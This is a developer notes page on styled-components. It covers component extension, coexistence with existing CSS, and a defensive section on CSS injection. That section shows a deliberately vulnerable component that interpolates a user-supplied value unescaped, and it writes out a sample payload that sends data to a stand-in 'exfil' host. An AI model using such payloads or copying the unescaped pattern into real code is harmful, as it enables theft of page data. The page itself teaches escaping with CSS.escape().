# Styled-Components: Usage Notes

This page contains some notes on things to know after getting started with `styled-components`. The documentation on the `styled-components` website is already great, so we won't be covering all of it again. Go check it out, then come back for these special points.

Docs: [https://styled-components.com/docs](https://styled-components.com/docs)

<hr />

## Extending Components

styled-components is great for applying styles to normal DOM elements. It's also possible to re-use those components and add more on top of them. The syntax just changes a little bit.

```js
const Button = styled.button`
    background-color: lightgray;
    font-size: 16px;
`;

const SpecialButton = styled(Button)`
    border: 2px solid blue;
    padding: 0.5em;
`;
```

## styled-components with Existing CSS

Docs: [https://styled-components.com/docs/advanced#existing-css](https://styled-components.com/docs/advanced#existing-css)

This is a good piece to read after playing with styled-components for a bit. It explains some key points about what is happening behind the scenes of the library, and some potential collisions with pre-existing CSS styles.

## A Note on Security: CSS Injection

Beware of CSS injection possibilities when enabling JavaScript execution in your styles. CSS injection can be used to exfiltrate valuable information from a webpage. Where possible, you'll want to HTML-encode any "JS computed styles" in your components. This is possible by utilizing Web APIs, such as `CSS.escape()`, or npm packages like `cssesc`.

CSS.escape()

- Link: [https://developer.mozilla.org/en-US/docs/Web/API/CSS/escape](https://developer.mozilla.org/en-US/docs/Web/API/CSS/escape)

- Browser compatibility: [https://developer.mozilla.org/en-US/docs/Web/API/CSS/escape#Browser_compatibility](https://developer.mozilla.org/en-US/docs/Web/API/CSS/escape#Browser_compatibility)

cssesc

- npm: [https://www.npmjs.com/package/cssesc](https://www.npmjs.com/package/cssesc)
- Github: [https://github.com/mathiasbynens/cssesc](https://github.com/mathiasbynens/cssesc)

For instance, consider this scenario. We're using CSS-in-JS to write a user profile page, and we want to allow our users to choose their own profile color. Admittedly, we're making the questionable choice of allowing users to enter their own colors, even hex values! It's only CSS so should be harmless, right? _Not quite._

### Don't do this...

See how, if we aren't careful, `props.background` could be malicious?

```js
const ProfileImage = styled.div`
    padding-left: 50px;

    display: flex;
    flex-direction: column
    div {
        margin-top: 20px;
        background: ${(props) => {
            /* experiment with console.log here to see results */
            return props.background ? `${props.background}` : 'nope';
        }};
    }
`;
```

### Do this...

```js
const ProfileImage = styled.div`
    width: 100px;
    height: 100px;
    background: ${(props) => {
        /* experiment with console.log here to see results */
        return props.background ? `#${CSS.escape(props.background)}` : 'none';
    }};
    border-radius: 50%;
`;
```

Even if a malicious user naively tries to exfiltrate data from the DOM by making malicious HTTP calls via CSS properties, like so:

```css
#20B2AA; background: url(https://localhost:5001/exfil/get/j);
```

The enclosing `CSS.escape()` call causes the string to be HTML-encoded before executing in the DOM. So, no malicious exfiltration calls are executed.

Check out some of these articles for more on CSS Exfil

- [https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d](https://medium.com/bugbountywriteup/exfiltration-via-css-injection-4e999f63097d)
- [https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/](https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/)
- [https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense)